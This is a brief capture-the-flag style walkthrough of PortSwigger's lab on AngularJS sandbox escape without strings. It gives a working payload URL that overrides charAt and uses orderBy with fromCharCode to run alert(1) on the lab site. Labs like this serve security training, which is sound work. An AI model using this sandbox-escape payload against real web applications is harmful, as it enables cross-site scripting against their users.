## Welcome, my friend. Today we will start the [26. XSS lab](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings) in ```portswigger```
### Let's play this lab:

![image](https://github.com/user-attachments/assets/8ceef578-27e0-4f75-9773-0b2e569a219a)

#### First, we navigate inside the browser

![image](https://github.com/user-attachments/assets/e6be7884-b0b2-41e4-a997-01e2dac5093a)


### Go to ```inspect``` and search for ```hi```


![image](https://github.com/user-attachments/assets/6ea2bcb7-794d-4837-a0a5-4a6785d0c4ca)


### Let's enter ```javascript``` code in Our URL:

```
https://0a80007304668022844981e70017008e.web-security-academy.net/?search=hi&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

![image](https://github.com/user-attachments/assets/09e3a324-8b5c-4641-8c99-0b59630f0dbc)


-------

### Done! Congratulations, friends❤️‍🔥


<p align="center">
<img src="https://github.com/user-attachments/assets/2fec8d8f-22d5-4564-8544-4dab70e3cbe6" >
</p>
